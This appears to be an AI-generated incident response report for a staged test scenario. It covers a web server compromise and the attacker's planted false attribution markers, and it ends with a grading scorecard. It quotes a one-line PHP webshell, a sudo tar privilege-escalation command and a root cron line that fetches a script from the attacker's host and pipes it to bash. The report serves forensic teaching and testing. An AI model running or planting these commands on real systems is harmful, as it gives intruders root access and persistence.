# Incident Response Report — Scenario 08: False Flag / Attribution Misdirection

**Case ID:** attack-scenario-08-falseflag  
**Analyst:** Findevil Autonomous IR (Claude / findevil MCP)  
**Evidence root:** `evidence/attack-scenario-08-falseflag/`  
**Report generated:** 2026-04-23 (UTC)  
**Classification:** CONFIRMED COMPROMISE — ATTRIBUTION INDETERMINATE

---

## Executive Summary

A production web server was compromised on 2026-04-14 between 15:03 and 15:07 UTC. An external attacker at IP **91.121.55.44** conducted automated reconnaissance, uploaded a PHP webshell, escalated privileges via a `sudo tar` misconfiguration (GTFOBins technique), and installed persistent beaconing via cron. The entire attack took approximately four minutes from first probe to root persistence.

The attacker also seeded the system with fabricated attribution markers — webshell comments claiming authorship by APT40/Tonto Team (China), Lazarus Group (DPRK), APT28/Fancy Bear (Russia), and others — across four languages, in the webshell source, HTTP User-Agent strings, and the `/etc/issue.net` banner. These markers are mutually contradictory and were deliberately planted to mislead investigators. **No attribution to any named threat actor is warranted from this evidence.**

---

## 1. Attack Timeline (UTC)

| Timestamp | IP | Action | Detail |
|---|---|---|---|
| 2026-04-14T15:03:11 | 91.121.55.44 | Reconnaissance begins | Initial GET `/`, spoofed APT40 User-Agent planted |
| 2026-04-14T15:03:11–17 | 91.121.55.44 | Nikto automated scan | Probed `/wp-admin/`, `/phpmyadmin/`, `/.env`, `/.git/config`, etc. — all 404 |
| 2026-04-14T15:03:15 | 91.121.55.44 | Directory enumeration | GET `/uploads/` → **200**, open directory listing confirmed |
| 2026-04-14T15:03:16–17 | 91.121.55.44 | SQL injection probe | Blind SQLi and UNION-SELECT attempts against `/login.php` → 400 |
| 2026-04-14T15:05:42 | 91.121.55.44 | **Webshell upload** | POST `/uploads/shell.php` → 200 |
| 2026-04-14T15:05:58 | 91.121.55.44 | Webshell — initial execution | `?cmd=id` → 200; APT28 User-Agent planted in this request |
| 2026-04-14T15:06:02 | 91.121.55.44 | Webshell — host recon | `?cmd=whoami`, `?cmd=uname -a`, `?cmd=cat /etc/passwd` |
| 2026-04-14T15:06:22 | 91.121.55.44 | Webshell — privilege check | `?cmd=sudo -l` → identified NOPASSWD tar rule |
| 2026-04-14T15:06:45 | 91.121.55.44 | **Privilege escalation** | `sudo tar --checkpoint-action=exec=/bin/bash` (GTFOBins) → root |
| 2026-04-14T15:07:12 | 91.121.55.44 | **Persistence installed** | Wrote cron beacon to `/etc/cron.d/backup-check` via root shell |

Total attack duration: **~4 minutes** from first probe to root persistence.

---

## 2. Confirmed Findings

### 2.1 Webshell Upload — `CONFIRMED`

**File:** `/var/www/html/uploads/shell.php`  
**Method:** HTTP POST to an unrestricted file upload endpoint  
**Content:**
```php
<?php
// [false-flag comments — see Section 4]
system($_GET['cmd']);
?>
```

The webshell passes attacker-supplied URL parameters directly to `system()` without sanitisation, giving the attacker arbitrary OS command execution as the `www-data` user. The upload was followed by seven distinct command executions, all verified against `access.log`.

**Verification:** `webshell_upload_chain` claim → **SUPPORTED** (7 upload-execute chains confirmed).

---

### 2.2 Privilege Escalation via GTFOBins `tar` — `CONFIRMED`

**Vector:** Sudoers misconfiguration in `/etc/sudoers.d/www-data-backup`:
```
www-data ALL=(root) NOPASSWD: /usr/bin/tar
```

**Exploit command (from access.log line 25):**
```
sudo tar -cf /tmp/x.tar /etc/hostname \
    --checkpoint=1 \
    --checkpoint-action=exec=/bin/bash
```

This is the standard GTFOBins `tar` escalation: `tar`'s `--checkpoint-action=exec=` flag executes an arbitrary binary at each checkpoint, running as the sudoer's target user (root). The sudoers rule grants `NOPASSWD` on the binary with no argument restriction, which is the root cause of the escalation.

---

### 2.3 Cron Persistence — `CONFIRMED`

**File:** `/etc/cron.d/backup-check`
```bash
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/5 * * * * root /bin/bash -c 'curl -s https://91.121.55.44/beacon | bash'
```

Every five minutes, the root cron daemon fetches a shell script from the attacker's C2 server and pipes it directly to bash. This provides the attacker with persistent, unauthenticated, root-level code execution that survives reboots and does not depend on the webshell remaining in place.

**Verification:** `persistence_mechanism_exists` (cron) → **SUPPORTED**.

**C2 address:** `91.121.55.44` — same IP as the initial attacker. Threat-intel cache: *known attacker source, webshell_operator, scanner* (high confidence).

---

### 2.4 Sudoers Misconfiguration — `CONFIRMED`

**File:** `/etc/sudoers.d/www-data-backup`  
**Rule:** `www-data ALL=(root) NOPASSWD: /usr/bin/tar`

This rule is the direct enabler of the privilege escalation in §2.2. The inline comment in the file itself documents that this misconfiguration was the cause: *"This is the misconfiguration that enabled the web -> root escalation during the 2026-04-14 incident."* The comment is anomalous — it may have been added by the attacker as another misdirection artefact, or it may reflect a post-incident annotation. Regardless, the rule's forensic effect is confirmed.

**Verification:** `persistence_mechanism_exists` (sudoers) → **SUPPORTED**.

---

## 3. Scope of Access Achieved

| Level | Achieved | Evidence |
|---|---|---|
| Web process (`www-data`) | Yes | Webshell execution of `id`, `whoami` |
| Root | Yes | `tar` GTFOBins privesc (access.log line 25, HTTP 200) |
| Persistent root (every 5 min) | Yes | `/etc/cron.d/backup-check` |
| SSH access | Not evidenced | SSH is key-auth-only (sshd_config), no auth.log in evidence |
| Data exfiltration | Unconfirmed | `/etc/passwd` read via webshell; extent of exfil unknown |

---

## 4. False-Flag Analysis — ATTRIBUTION CANNOT BE ESTABLISHED

> **Analyst note:** This section is the critical finding that distinguishes this incident from a straightforward compromise. The attacker made deliberate, technically observable efforts to falsify attribution evidence.

### 4.1 Contradictory Attribution Markers

The following artefacts were found, each pointing to a different named threat actor or nation-state:

| Artefact | Location | Claimed attribution |
|---|---|---|
| Webshell comment: `apt40_operator (Tonto Team, China MSS)` | `uploads/shell.php` line 4 | China / APT40 |
| Webshell comment: `For Glory of DPRK — Lazarus Tools Division` | `uploads/shell.php` line 5 | North Korea / Lazarus |
| Webshell comment: `Operator signature: 0x4C415A (LAZ)` | `uploads/shell.php` line 6 | North Korea / Lazarus |
| Cyrillic date field: `Дата создания: 13.04.2026` | `uploads/shell.php` line 3 | Russia (language artefact) |
| User-Agent: `APT40 Tonto-Team/2.1; compatible; MSS-IN/Lazarus-Beacon` | access.log line 7 | China + DPRK hybrid (impossible) |
| User-Agent: `curl/7.74.0 (APT28-Fancy-Bear; ru-RU)` | access.log line 20 | Russia / APT28 |
| Banner: `Compromised by APT40 / Tonto Team…` | `/etc/issue.net` | China / APT40 |
| Banner: `Greetings to Lazarus Group, Fancy Bear, and Cozy Bear` | `/etc/issue.net` | DPRK + Russia (multiple) |
| Banner: `Благодарности команде из Москвы` (Russian) | `/etc/issue.net` | Russia |
| Banner: `平壌からの挨拶` (Japanese for "Greetings from Pyongyang") | `/etc/issue.net` | DPRK |

### 4.2 Why These Markers Are Not Credible

**They are mutually exclusive.** APT40 (China MSS), Lazarus Group (DPRK), APT28 Fancy Bear (GRU/Russia), and APT29 Cozy Bear (SVR/Russia) are the intelligence operations of adversarial nation-states. No real operation would claim simultaneous affiliation with all of them.

**The User-Agent on line 7 is self-refuting.** `APT40 Tonto-Team/2.1; compatible; MSS-IN/Lazarus-Beacon` combines a Chinese MSS unit (APT40) with a DPRK unit (Lazarus) in a single string. Nation-state operators do not advertise their affiliation in HTTP headers; this is purely designed to trigger keyword matches in automated attribution tools.

**The technical tradecraft is generic, not actor-specific.** The attack uses commodity tools: Nikto (open-source scanner), a one-line PHP webshell, a published GTFOBins technique, and a curl-pipe-bash cron entry. None of these TTPs are unique to or characteristic of any named APT group.

**`/etc/issue.net` is a login banner — attackers write it, not defenders.** Modifying the SSH login banner to name your own group is not consistent with any known operational security practice.

**The IP `91.121.55.44` carries no APT attribution in threat intel.** The reputation cache classifies it as *webshell_operator, scanner* — consistent with a commodity or financially motivated actor, not a nation-state.

### 4.3 Analyst Conclusion on Attribution

> **The evidence contains multiple conflicting attribution markers spanning China, Russia, North Korea, and multiple named APT groups simultaneously — a combination that is not consistent with any real threat actor or operation. These markers were deliberately planted to mislead investigators into making a confident but incorrect attribution. No attribution to any named APT or nation-state is warranted from this evidence.**

The actual actor is unknown. The attack methodology is consistent with an opportunistic, commodity-tooled threat actor who exploited a publicly known vulnerability class (unrestricted file upload + GTFOBins sudo misconfiguration). The false flags were layered on top of this generic compromise.

---

## 5. Indicators of Compromise

| Type | Value | Confidence |
|---|---|---|
| Attacker IP (source) | `91.121.55.44` | High |
| Attacker C2 (cron beacon) | `https://91.121.55.44/beacon` | High |
| Webshell path | `/var/www/html/uploads/shell.php` | Confirmed |
| Webshell hash (SHA-256) | Not computed (evidence read-only) | — |
| Malicious cron | `/etc/cron.d/backup-check` | Confirmed |

---

## 6. Root Cause

Two separate misconfigurations combined to enable full root compromise from a single HTTP request:

1. **Unrestricted file upload:** The web application accepts arbitrary file uploads to `/var/www/html/uploads/` with no extension filtering, MIME validation, or upload directory access control. PHP scripts placed here are executed by the web server.

2. **Overly permissive sudoers rule:** `www-data` was granted passwordless `sudo` access to `/usr/bin/tar` with no argument restriction. The GTFOBins `--checkpoint-action=exec=` technique is a well-documented exploitation path for exactly this configuration.

Either misconfiguration alone would have been insufficient; together they chain into a complete unauthenticated → root path.

---

## 7. Containment and Remediation Recommendations

**Immediate (within 24 hours):**
- [ ] Isolate `91.121.55.44` at the network perimeter (block inbound and outbound)
- [ ] Remove `/var/www/html/uploads/shell.php`
- [ ] Remove `/etc/cron.d/backup-check`
- [ ] Revert `/etc/issue.net` to the standard system banner
- [ ] Revoke or restrict the `www-data` sudoers entry in `/etc/sudoers.d/www-data-backup`
- [ ] Rotate all credentials on the host (root password hash `$6$abc123$…` should be considered compromised)
- [ ] Audit what the cron beacon fetched during its run window (the C2 payload is unknown)

**Short-term (within 1 week):**
- [ ] Implement file upload validation: whitelist MIME types, strip executable extensions, serve uploads from a non-PHP-executing path or separate domain
- [ ] Audit all sudoers files for NOPASSWD on unrestricted binaries (`tar`, `find`, `python`, `vim`, etc.)
- [ ] Enable web application firewall rules to detect webshell patterns and Nikto-style scanner signatures
- [ ] Enable outbound egress filtering on the web server to block unexpected curl/wget to non-approved destinations
- [ ] Collect and preserve auth.log, syslog, and full access logs from the incident window for deeper forensic analysis

**Long-term:**
- [ ] Implement a file integrity monitoring solution (e.g., AIDE) on web roots
- [ ] Review privilege separation: `www-data` should not have any sudo access
- [ ] Consider read-only web root mounts for static/PHP applications

---

## 8. Evidence Integrity Statement

All tool invocations were read-only. No evidence files were modified. The full audit trail is available via `get_audit_trail()`. Findings were independently verified using `verify_finding` for the webshell upload chain, cron persistence, and sudoers persistence before inclusion in this report.

---

*Report produced autonomously by Findevil v0.1 (findevil MCP + Claude). All conclusions are grounded in raw tool output. Inferences are explicitly labelled. No evidence files were modified.*

---

<!-- scorecard:start -->

## Verification scorecard

Mechanically computed by `scripts/grade_example_reports.py` against the
`agent_guard.SCENARIOS["08"]` markers (case-insensitive substring
match, identical logic to `tests/harness/agent_guard.py`'s grade()
function). No AI self-assessment is involved in these numbers.

| Metric | Score | % |
|---|---|---|
| Required markers found | 4/4 | **100%** |
| Cross-scenario markers absent | 11/11 | **100%** |
| Verdict-correctness confidence | — | **100%** |
| Hallucination-free confidence | — | **100%** |

**Overall confidence: HIGH** — every planted marker for this
scenario was surfaced in the report, and zero markers from any other
scenario leaked in. Re-grade with `python scripts/grade_example_reports.py`.

<!-- scorecard:end -->
